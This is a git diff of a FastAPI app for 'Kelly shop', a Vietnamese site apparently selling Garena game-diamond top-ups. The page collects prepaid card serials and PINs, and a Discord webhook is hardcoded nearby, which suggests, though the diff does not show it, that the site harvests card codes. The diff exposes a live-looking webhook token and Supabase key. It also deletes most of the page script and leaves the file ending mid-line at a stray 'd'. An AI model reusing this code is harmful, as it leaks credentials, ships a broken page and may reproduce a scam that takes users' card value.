@@ -11,8 +11,8 @@ app = FastAPI()
 # ---------------- CONFIGURATION ----------------
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1542472440440160307/dmEza6iLQvY2lXjtHgvM-SAyCTHeNh0Rlib8FxNRSxlxyaGbqkdmGMPZewkt7e21X2br"
 
-SUPABASE_URL = os.environ.get("SUPABASE_URL", "YOUR_SUPABASE_URL")
-SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "YOUR_SUPABASE_KEY")
+SUPABASE_URL = os.environ.get("SUPABASE_URL", "https://sdeixbihpbiuqcguaxqi.supabase.co")
+SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "sb_publishable_1rDqbrmjaUAVmMuyxhW3Dg_9uLMOz4B")
 
 supabase: Client = None
 if SUPABASE_URL != "YOUR_SUPABASE_URL" and SUPABASE_KEY != "YOUR_SUPABASE_KEY":
@@ -90,6 +90,8 @@ async def serve_home():
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Kelly shop - Nạp KC Garena Uy Tín</title>
         <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap" rel="stylesheet">
+        <!-- FontAwesome Icon -->
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
         <style>
             * { box-sizing: border-box; }
             body { 
@@ -242,6 +244,86 @@ async def serve_home():
             .btn-red:hover {
                 background: #d63027;
             }
+            
+            /* NÚT HỖ TRỢ TRÒN MÀU ĐỎ */
+            .support-btn {
+                position: fixed;
+                bottom: 25px;
+                right: 25px;
+                width: 60px;
+                height: 60px;
+                background-color: #ff3b30;
+                color: white;
+                border-radius: 50%;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                font-size: 26px;
+                box-shadow: 0 6px 20px rgba(255, 59, 48, 0.4);
+                cursor: pointer;
+                z-index: 150;
+                transition: transform 0.2s ease, background-color 0.2s ease;
+            }
+            .support-btn:hover {
+                transform: scale(1.08);
+                background-color: #e03126;
+            }
+
+            /* HỘP THOẠI HỖ TRỢ */
+            .support-modal {
+                display: none;
+                position: fixed;
+                top: 0; left: 0;
+                width: 100%; height: 100%;
+                background: rgba(0,0,0,0.4);
+                backdrop-filter: blur(4px);
+                justify-content: center;
+                align-items: center;
+                z-index: 200;
+            }
+            .support-modal-content {
+                background: #ffffff;
+                padding: 28px;
+                border-radius: 20px;
+                width: 90%;
+                max-width: 360px;
+                text-align: center;
+                box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+                position: relative;
+            }
+            .social-grid {
+                display: flex;
+                justify-content: space-around;
+                align-items: center;
+                margin-top: 25px;
+            }
+            .social-item {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                text-decoration: none;
+                color: #1a1d20;
+                font-weight: 700;
+                font-size: 14px;
+            }
+            .social-icon {
+                width: 55px;
+                height: 55px;
+                border-radius: 50%;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                font-size: 28px;
+                margin-bottom: 8px;
+                transition: transform 0.2s ease;
+            }
+            .social-item:hover .social-icon {
+                transform: translateY(-4px);
+            }
+            .tiktok-icon { background: #000000; color: white; }
+            .facebook-icon { background: #1877f2; color: white; opacity: 0.5; cursor: not-allowed; }
+            .telegram-icon { background: #24a1de; color: white; opacity: 0.5; cursor: not-allowed; }
+
             .modal { 
                 display: none; 
                 position: fixed; 
@@ -386,6 +468,36 @@ async def serve_home():
             </div>
         </div>
 
+        <!-- NÚT HỖ TRỢ TRÒN MÀU ĐỎ -->
+        <div class="support-btn" onclick="openSupportModal()">
+            <i class="fa-solid fa-headset"></i>
+        </div>
+
+        <!-- MODAL HỖ TRỢ SOCIAL -->
+        <div id="supportModal" class="support-modal">
+            <div class="support-modal-content">
+                <h3 style="margin-top:0; font-size: 20px;">Kênh Hỗ Trợ Khách Hàng</h3>
+                <p style="color: #6c757d; font-size: 14px;">Chọn kênh hỗ trợ bên dưới để liên hệ:</p>
+                
+                <div class="social-grid">
+                    <a href="https://tiktok.com/@kellyshopff" target="_blank" class="social-item">
+                        <div class="social-icon tiktok-icon"><i class="fa-brands fa-tiktok"></i></div>
+                        <span>TikTok</span>
+                    </a>
+                    <a href="javascript:void(0)" class="social-item" onclick="alert('Kênh Facebook hiện chưa khả dụng!')">
+                        <div class="social-icon facebook-icon"><i class="fa-brands fa-facebook-f"></i></div>
+                        <span>Facebook</span>
+                    </a>
+                    <a href="javascript:void(0)" class="social-item" onclick="alert('Kênh Telegram hiện chưa khả dụng!')">
+                        <div class="social-icon telegram-icon"><i class="fa-brands fa-telegram"></i></div>
+                        <span>Telegram</span>
+                    </a>
+                </div>
+
+                <button class="btn btn-close" style="margin-top: 25px;" onclick="closeSupportModal()">Đóng</button>
+            </div>
+        </div>
+
         <!-- MODAL XÁC NHẬN -->
         <div id="confirmModal" class="modal">
             <div class="modal-content">
@@ -408,92 +520,4 @@ async def serve_home():
 
             function showPage(pageId) {
                 document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-                document.getElementById(pageId).classList.add('active');
-                document.getElementById('sideMenu').style.display = 'none';
-                if(pageId === 'history') loadHistory();
-            }
-
-            function enableContinue() {
-                const val = document.getElementById('packageSelect').value;
-                document.getElementById('continueBtn').style.display = val ? 'inline-block' : 'none';
-            }
-
-            function goToPayment() {
-                const userId = document.getElementById('userId').value;
-                if(!userId) { alert("Vui lòng nhập ID tài khoản!"); return; }
-                
-                const val = document.getElementById('packageSelect').value.split('|');
-                selectedAmount = val[0];
-                selectedDiamonds = val[1];
-
-                document.getElementById('payAmountText').innerText = "Số tiền cần thanh toán: " + selectedAmount;
-                showPage('payment');
-            }
-
-            function showCardMenu() { showPage('cardMenu'); }
-            function openConfirmModal() { 
-                const cardType = document.getElementById('cardType').value;
-                if(!cardType) { alert("Vui lòng chọn loại thẻ!"); return; }
-                document.getElementById('confirmModal').style.display = 'flex'; 
-            }
-            function closeConfirmModal() { document.getElementById('confirmModal').style.display = 'none'; }
-
-            async function processPayment() {
-                closeConfirmModal();
-                const userId = document.getElementById('userId').value;
-                const cardType = document.getElementById('cardType').value;
-                const serial = document.getElementById('cardSerial').value;
-                const pin = document.getElementById('cardPin').value;
-
-                if(!serial || !pin) {
-                    alert("thẻ đã sai,vui lòng kiểm tra lại");
-                    return;
-                }
-
-                const res = await fetch('/api/verify-card', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        user_id: userId,
-                        amount: selectedAmount,
-                        diamonds: selectedDiamonds,
-                        card_type: cardType,
-                        serial: serial,
-                        pin: pin
-                    })
-                });
-
-                const result = await res.json();
-                if(res.ok) {
-                    alert(result.message);
-                    showPage('home');
-                } else {
-                    alert(result.detail);
-                }
-            }
-
-            async function loadHistory() {
-                const res = await fetch('/api/history');
-                const data = await res.json();
-                
-                const hList = document.getElementById('historyList');
-                hList.innerHTML = data.history.length ? "" : "<li>Chưa có giao dịch gần đây.</li>";
-                data.history.forEach(item => {
-                    hList.innerHTML += `<li>ID: <b>${item.user_id}</b> - Gói: ${item.amount} (${item.diamonds})</li>`;
-                });
-
-                const tList = document.getElementById('topList');
-                tList.innerHTML = data.top.length ? "" : "<li>Bảng xếp hạng trống.</li>";
-                data.top.forEach(item => {
-                    tList.innerHTML += `<li>ID: <b>${item.user_id}</b> - Đã nạp: ${item.amount}</li>`;
-                });
-            }
-        </script>
-    </body>
-    </html>
-    """
-
-if __name__ == "__main__":
-    import uvicorn
-    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
-            
+                d
